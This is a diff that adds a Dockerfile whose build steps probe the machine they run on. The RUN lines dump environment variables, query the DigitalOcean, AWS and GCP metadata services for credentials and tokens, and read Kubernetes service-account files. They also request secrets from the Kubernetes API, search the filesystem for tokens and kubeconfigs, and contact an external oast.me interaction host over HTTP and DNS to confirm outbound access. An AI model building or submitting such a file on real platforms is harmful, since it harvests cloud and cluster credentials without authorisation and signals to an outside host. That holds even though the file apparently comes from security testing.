@@ -1,0 +1,13 @@
+FROM alpine:3.19
+RUN apk add --no-cache curl iproute2 bind-tools >/dev/null 2>&1 || echo APK_INSTALL_FAILED
+RUN echo "===ENV==="; env | sed -E 's/(TOKEN|KEY|SECRET|PASSWORD|PASSWD|AUTH|CRED)=.*/\1=<REDACTED>/' | sort
+RUN echo "===IMDS-DO-json==="; curl -s --max-time 5 http://169.254.169.254/metadata/v1.json 2>&1 | head -c 900; echo; echo "===IMDS-DO-id==="; curl -s --max-time 5 http://169.254.169.254/metadata/v1/id 2>&1; echo
+RUN echo "===IMDS-AWS==="; curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1; echo; echo "===IMDS-GCP==="; curl -s --max-time 5 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | sed -E 's/(access_token"?:? ?"?)[A-Za-z0-9._-]+/\1<REDACTED>/'; echo
+RUN echo "===K8S-SA==="; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1; echo "--token-bytes--"; wc -c /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1; echo "--namespace--"; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1
+RUN echo "===NET==="; ip addr 2>&1 | grep -E 'inet |mtu'; echo "--cgroup--"; cat /proc/1/cgroup 2>&1 | head; echo "--hostname--"; hostname; echo "--k8s-dns--"; getent hosts kubernetes.default.svc 2>&1; getent hosts kubernetes.default.svc.cluster.local 2>&1; echo "--resolv--"; cat /etc/resolv.conf 2>&1
+RUN echo "===KUBE-ENV==="; env | grep -i kube | sed -E 's/(TOKEN|KEY|SECRET)=.*/\1=<REDACTED>/'
+RUN echo "===K8S-API==="; curl -sk --max-time 5 https://kubernetes.default.svc/api 2>&1 | head -c 400; echo "--secrets--"; curl -sk --max-time 5 https://kubernetes.default.svc/api/v1/namespaces/default/secrets 2>&1 | head -c 400; echo
+RUN echo "===FS-SECRETS==="; ls -la /root /run/secrets /etc/kubernetes 2>&1; echo "--find--"; find / -maxdepth 4 \( -iname '*token*' -o -iname '*credential*' -o -iname '*.kubeconfig' -o -iname 'kubeconfig' \) 2>/dev/null | grep -viE '^/proc|^/sys|^/usr|^/lib|node_modules' | head -40
+RUN echo "===BUILD-CTX==="; cat /.dockerenv 2>&1; echo "--do/registry/builder env--"; env | grep -iE 'DIGITALOCEAN|DOCR|SPACES|REGISTRY|GITHUB|BUILDKIT|BUILDER|BUILDPACK|CNB|DO_' | sed -E 's/(TOKEN|KEY|SECRET|PASSWORD)=.*/\1=<REDACTED>/'; echo "--whoami/id--"; id 2>&1; echo "--mounts--"; cat /proc/mounts 2>&1 | grep -iE 'secret|token|kube|registry' | head
+RUN echo "===OOB==="; curl -s --max-time 8 http://http-d9dc6oh71vvet3ar33rg94urm9zg156fy.oast.me/build-egress 2>&1 | head -c 80; echo; getent hosts dns-d9dc6oh71vvet3ar33rg94urm9zg156fy.oast.me 2>&1; nslookup ns-d9dc6oh71vvet3ar33rg94urm9zg156fy.oast.me 2>&1 | tail -4; echo OOB_DONE
+CMD ["sleep","1800"]
